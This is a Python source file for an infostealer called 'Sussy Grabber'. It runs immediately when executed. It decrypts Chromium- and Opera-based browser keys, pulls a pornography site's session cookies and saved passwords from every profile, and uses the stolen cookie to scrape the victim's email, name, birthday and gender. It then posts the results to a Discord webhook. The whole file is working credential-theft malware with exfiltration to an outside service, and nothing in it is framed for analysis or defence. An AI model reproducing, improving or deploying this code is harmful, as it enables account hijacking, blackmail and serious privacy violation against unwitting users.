import requests, os, base64, shutil
from json import loads
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from Crypto.Cipher import AES
from discord_webhook import DiscordWebhook, DiscordEmbed

wbh = ""

class Sussy:

    def __init__(self):
        self.cookies = []
        self.temppath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Temp")
        self.paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
        self.profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        for pvth in self.paths:
            if "Opera Software" in pvth:
                try:
                    key = self.__FindKey__(os.path.join(pvth, "Local State"))
                    self.__Cookie__(pvth+"\\Network\\Cookies",key)
                except:
                    pass
            else:
                for prof in self.profs:
                    try:
                        key = self.__FindKey__(os.path.join(pvth, "Local State"))
                        self.__Cookie__(os.path.join(pvth,prof, "Network","Cookies"),key)
                    except:
                        pass
        try:
            os.remove(self.temppath+"\\pcookies")
        except:
            pass
        if len(self.cookies) > 0:
            for cookie in self.cookies:
                self.__Info__(cookie)

    def __FindKey__(self,path):
        return CryptUnprotectData(base64.b64decode(loads(open(path,'r',encoding='utf-8').read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

    def __Password__(self,k,p,u,e):
        ppassword = ""
        temp = self.temppath+"\\ppasswords"
        shutil.copy(p, temp)
        c = connect(temp)
        cur = c.cursor()
        for vals in cur.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
            url, name, password = vals
            if "pornhub" in url:
                if str(name) == u or str(name) == e:
                    ppassword = (AES.new(k, AES.MODE_GCM, password[3:15])).decrypt(password[15:])[:-16].decode()
                    return ppassword
        c.close();cur.close()

    def __Cookie__(self,p,k):
        temp = self.temppath+"\\pcookies"
        shutil.copy(p, temp)
        c = connect(temp)
        cur = c.cursor()
        for row in cur.execute("SELECT * FROM cookies").fetchall():
            if str(row[1]) == ".pornhub.com" and str(row[3]) == "il":
                self.cookies.append((AES.new(k, AES.MODE_GCM, row[5][3:15])).decrypt(row[5][15:])[:-16].decode())
        c.close();cur.close()

    def __Info__(self,c):
        r=requests.get("https://www.pornhub.com/user/edit",cookies={"il": c}).text
        r2=requests.get("https://www.pornhub.com/user/security",cookies={"il": c}).text
        Thumb = r.split('<img class="smallAvatar" src="')[1].split('"')[0]
        Username = r.split('<span>Welcome <')[1].split('href="/users/')[1].split('"')[0]
        self.content = f"""
:bust_in_silhouette: ``Account Of : {Username}``"""
        try:
            Email = r2.split('name="email" value="')[1].split('"')[0]
            self.content += f"""
    ``|_``:envelope: ``Email (Verified) : {Email}``"""
            Password = ""
            for pvth in self.paths:
                if "Opera Software" in pvth:
                    try:
                        key = self.__FindKey__(os.path.join(pvth, "Local State"))
                        Password = self.__Password__(key,os.path.join(pvth+"Login Data"),Username,Email)
                        if Password != "":
                            break
                    except:
                        pass
                else:
                    for prof in self.profs:
                        try:
                            key = self.__FindKey__(os.path.join(pvth, "Local State"))
                            Password = self.__Password__(key,os.path.join(pvth,prof, "Login Data"),Username,Email)
                            if Password != "":
                                break
                        except:
                            pass
            if Password != "":
                self.content += f"""
    ``|_``:lock: ``Password : {Password}``"""
            else:
                self.content += f"""
    ``|_``:lock: ``Password :`` :x:"""
            try:
                Prem = r.split('"isPremium":')[1].split(',')[0]
                if Prem == "0":
                    self.content += f"""
    ``|_``:gem: ``Premium :`` :x:"""
                else:
                    self.content += f"""
    ``|_``:gem: ``Premium :`` :white_check_mark:"""
            except:
                self.content += f"""
    ``|_``:gem: ``Premium :`` :x:"""
            self.content += f"""
    ``|``"""
            try:  
                Name = r.split('<label>Name:</label>')[1].split('value="')[1].split('"')[0]
                if len(Name) < 1:
                    self.content += f"""
    ``|_``:label: ``Name :`` :x:"""
                elif Name == "0":
                    self.content += f"""
    ``|_``:label: ``Name :`` :x:"""
                else:
                    self.content += f"""
    ``|_``:label: ``Name : {Name}``"""
            except:
                    self.content += f"""
    ``|_``:label: ``Name :`` :x:"""
            try:
                Birthday = r.split('<label>Birthday:</label>')[1]
                y = Birthday.split('<div class="dateOfBirth modelBirthday dateYear">')[1].split('<')[0]
                m = Birthday.split('<div class="dateOfBirth modelBirthday dateMonth">')[1].split('<')[0]
                d = Birthday.split('<div class="dateOfBirth modelBirthday dateDay">')[1].split('<')[0]
                self.content += f"""
    ``|_``:date: ``Birthday : {y}/{m}/{d}``"""
            except:
                self.content += f"""
    ``|_``:date: ``Birthday :`` :x:"""
            try:
                Gender = r.split('<select class="" name="gender" >')[1].split('selected="selected">')[1].split('<')[0]
                if Gender == "Male":
                    self.content += f"""
    ``|_``:mens: ``Gender : {Gender}``"""
                elif Gender == "---":
                    self.content += f"""
    ``|_``:mens: ``Gender :`` :x:"""
                elif Gender == "Female":
                    self.content += f"""
    ``|_``:womens: ``Gender : {Gender}``"""
                elif Gender == "Couple":
                    self.content += f"""
    ``|_``:restroom: ``Gender : {Gender}``"""
                else:
                    self.content += f"""
    ``|_``:clown: ``Gender : {Gender}``"""
            except:
                self.content += f"""
    ``|_``:mens: ``Gender :`` :x:"""
            self.content += f"""
    ``|``"""
            self.content += f"""
    ``|_``:cookie: ``Cookie (il) : {c}``"""
            webhook = DiscordWebhook(url=wbh, username="Sussy Grabber", avatar_url=r"https://cdn.discordapp.com/attachments/1092274601058373703/1092278533058998352/download_2.png")
            embed = DiscordEmbed(title=f"Sussy Grabber Hit", description=self.content, color='000000')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1092274601058373703/1092278533058998352/download_2.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_thumbnail(url=Thumb)
            embed.set_image(url="https://cdn.discordapp.com/attachments/1087907951735492631/1092315902986432522/video.gif")
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()
        except:
            pass

Sussy()